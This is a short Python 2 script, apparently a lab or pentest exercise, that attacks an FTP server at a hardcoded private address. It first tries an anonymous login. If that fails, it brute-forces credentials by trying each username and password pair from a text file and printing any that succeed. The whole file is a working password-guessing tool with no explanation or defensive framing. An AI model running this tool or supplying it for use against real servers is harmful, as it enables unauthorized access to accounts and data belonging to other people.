import ftplib
def anonLogin(hostname):
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login('anonymous', 'me@your.com')
		print '\n[*] ' + str(hostname) +' FTP Anonymous Logon Succeeded.'
		ftp.quit()
		return True
	except Exception, e:
		print '\n[-] ' + str(hostname) +' FTP Anonymous Logon Failed.'
		return False

def bruteLogin(hostname, passwdFile):
	pF = open(passwdFile, 'r')
	for line in pF.readlines():
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\r').strip('\n')
		print "[+] Trying: "+userName+"/"+passWord
		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(userName, passWord)
			print '\n[*] ' + str(hostname) +' FTP Logon Succeeded: '+userName+"/"+passWord
			ftp.quit()
			return (userName, passWord)
		except Exception, e:
			pass
	print '\n[-] Could not brute force FTP credentials.'
	return (None, None)

host = '172.16.26.74'
passwdFile = 'userpass.txt'


def main():
	if not anonLogin(host):
		bruteLogin(host, passwdFile)

if __name__ == "__main__":
	main()
		